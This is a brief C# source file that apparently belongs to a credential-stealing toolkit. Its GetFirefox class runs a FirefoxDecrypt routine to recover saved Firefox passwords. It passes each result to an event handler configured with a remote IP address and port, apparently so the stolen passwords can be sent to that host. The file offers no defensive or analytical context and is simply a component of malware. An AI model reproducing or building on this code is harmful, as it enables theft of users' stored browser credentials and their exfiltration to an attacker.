using PS03.PasswordOps.FirefoxDecrypt;

namespace PS03.PasswordOps
{
    public class GetFirefox
    {
        private int _port;
        private string _ip;
        private bool trans;
        private bool verbose;

        public GetFirefox(string ip, int port, bool t, bool v)
        {
            trans = t;
            verbose = v;
            this._ip = ip;
            this._port = port;
        }
        public void Execute()
        {
            var ev = new Eventhandlers(_ip,_port,trans,verbose);
            FDC.OnPasswordReady += ev.HandleFirefoxDataReady;
            FDC.Execute();
        }
    }
}
